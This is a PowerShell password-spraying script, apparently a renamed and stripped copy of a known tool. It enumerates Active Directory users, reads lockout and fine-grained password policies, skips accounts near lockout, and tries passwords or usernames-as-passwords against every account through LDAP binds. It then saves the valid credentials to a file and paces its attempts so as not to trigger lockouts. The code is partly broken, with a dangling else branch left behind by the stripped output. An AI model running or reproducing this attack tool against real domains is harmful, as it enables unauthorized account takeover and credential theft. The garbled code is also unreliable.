function Invoke-DPS{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $UserList = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $Password,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $PasswordList,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $OutFile,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $Filter = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [string]
     $Domain = "",

     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $Force,

     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $UsernameAsPassword,

     [Parameter(Position = 8, Mandatory = $false)]
     [int]
     $Delay=0,

     [Parameter(Position = 9, Mandatory = $false)]
     $Jitter=0,

     [Parameter(Position = 10, Mandatory = $false)]
     [switch]
     $Quiet,

     [Parameter(Position = 11, Mandatory = $false)]
     [int]
     $Fudge=10
    )

    if ($Password)
    {
        $Passwords = @($Password)
    }
    elseif($UsernameAsPassword)
    {
        $Passwords = ""
    }
    elseif($PasswordList)
    {
        $Passwords = Get-Content $PasswordList
    }
    else
    {
                break
    }

    try
    {
        if ($Domain -ne "")
        {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else
        {
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
                break
    }

    if ($UserList -eq "")
    {
        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter
    }
    else
    {
                        $UserListArray = @()
        try
        {
            $UserListArray = Get-Content $UserList -ErrorAction stop
        }
        catch [Exception]
        {
                        break
        }

    }


    $observation_window = Get-ObservationWindow $CurrentDomain

            if (!$Force)
    {
        $title = "Confirm Password Spray"
        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"

        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

        $result = $host.ui.PromptForChoice($title, $message, $options, 0)

        if ($result -ne 0)
        {
                        break
        }
    }
        
    if($UsernameAsPassword)
    {
        Invoke-SSP -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword -Quiet $Quiet
    }
    else
    {
        for($i = 0; $i -lt $Passwords.count; $i++)
        {
            Invoke-SSP -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter -Quiet $Quiet
            if (($i+1) -lt $Passwords.count)
            {
                Countdown-Timer -Seconds (60*$observation_window + $Fudge) -Quiet $Quiet
            }
        }
    }

        }

function Countdown-Timer
{
    param(
        $Seconds = 1800,
        $Message = "[*] Pausing to avoid account lockout.",
        [switch] $Quiet = $False
    )
    if ($quiet)
    {
                Start-Sleep -Seconds $Seconds
    } else {
        foreach ($Count in (1..$Seconds))
        {
            Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
            Start-Sleep -Seconds 1
        }
        Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
    }
}

function Get-DomainUserList
{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $Domain = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $RemoveDisabled,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $RemovePotentialLockouts,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $Filter
    )

    try
    {
        if ($Domain -ne "")
        {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else
        {
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
                break
    }
    $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
    $AccountLockoutThresholds = @()
    $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold
    $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
    if ($behaviorversion -ge 3)
    {
                $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $ADSearcher.SearchRoot = $objDeDomain
        $ADSearcher.Filter = "(objectclass=msDS-PasswordSettings)"
        $PSOs = $ADSearcher.FindAll()

        if ( $PSOs.count -gt 0)
        {
                        foreach($entry in $PSOs)
            {
                $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
                $PSOPolicyName = $PSOFineGrainedPolicy.name
                $PSOLockoutThreshold = $PSOFineGrainedPolicy.'msds-lockoutthreshold'
                $PSOAppliesTo = $PSOFineGrainedPolicy.'msds-psoappliesto'
                $PSOMinPwdLength = $PSOFineGrainedPolicy.'msds-minimumpasswordlength'
                $AccountLockoutThresholds += $PSOLockoutThreshold

                            }
        }
    }

    $observation_window = Get-ObservationWindow $CurrentDomain
    [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
    
        else
    {
            }

    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
    $UserSearcher.SearchRoot = $DirEntry

    $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
    $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    if ($RemoveDisabled)
    {
                $UserSearcher.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
    }
    else
    {
        $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)$Filter)"
    }

    $UserSearcher.PropertiesToLoad.add("samaccountname") > $Null
    $UserSearcher.PropertiesToLoad.add("lockouttime") > $Null
    $UserSearcher.PropertiesToLoad.add("badpwdcount") > $Null
    $UserSearcher.PropertiesToLoad.add("badpasswordtime") > $Null
    $UserSearcher.PageSize = 1000
    $AllUserObjects = $UserSearcher.FindAll()
        $UserListArray = @()

    if ($RemovePotentialLockouts)
    {
                foreach ($user in $AllUserObjects)
        {
            $badcount = $user.Properties.badpwdcount
            $samaccountname = $user.Properties.samaccountname
            try
            {
                $badpasswordtime = $user.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $currenttime = Get-Date
            $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
            $timedifference = ($currenttime - $lastbadpwd).TotalMinutes

            if ($badcount)
            {
                [int]$userbadcount = [convert]::ToInt32($badcount, 10)
                $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount
                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
                                {
                    $UserListArray += $samaccountname
                }
            }
        }
    }
    else
    {
        foreach ($user in $AllUserObjects)
        {
            $samaccountname = $user.Properties.samaccountname
            $UserListArray += $samaccountname
        }
    }

        return $UserListArray
}

function Invoke-SSP
{
    param(
            [Parameter(Position=1)]
            $Domain,
            [Parameter(Position=2)]
            [string[]]
            $UserListArray,
            [Parameter(Position=3)]
            [string]
            $Password,
            [Parameter(Position=4)]
            [string]
            $OutFile,
            [Parameter(Position=5)]
            [int]
            $Delay=0,
            [Parameter(Position=6)]
            [double]
            $Jitter=0,
            [Parameter(Position=7)]
            [switch]
            $UsernameAsPassword,
            [Parameter(Position=7)]
            [switch]
            $Quiet
    )
    $time = Get-Date
    $count = $UserListArray.count
        $curr_user = 0
        $RandNo = New-Object System.Random

    foreach ($User in $UserListArray)
    {
        if ($UsernameAsPassword)
        {
            $Password = $User
        }
        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)
        if ($Domain_check.name -ne $null)
        {
            if ($OutFile -ne "")
            {
                Add-Content $OutFile $User`:$Password
            }
                    }
        $curr_user += 1
        if ($Delay)
        {
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        }
    }

}

function Get-ObservationWindow($DomainEntry)
{
    $lockObservationWindow_attr = $DomainEntry.Properties['lockoutObservationWindow']
    $observation_window = $DomainEntry.ConvertLargeIntegerToInt64($lockObservationWindow_attr.Value) / -600000000
    return $observation_window
}

$a = "`r`nLoaded DPS`r`n"
$a
